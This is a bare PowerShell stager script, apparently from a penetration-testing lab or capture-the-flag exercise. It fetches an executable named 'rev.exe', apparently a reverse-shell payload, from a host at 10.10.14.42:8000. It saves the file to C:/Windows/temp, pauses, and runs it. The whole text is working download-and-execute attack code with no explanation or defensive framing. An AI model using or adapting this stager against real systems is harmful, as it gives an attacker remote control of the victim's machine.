$url = "http://10.10.14.42:8000/rev.exe"
$outpath = "C:/Windows/temp/rev.exe"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)
Start-Sleep -s 5
Start-Process -Filepath $outpath
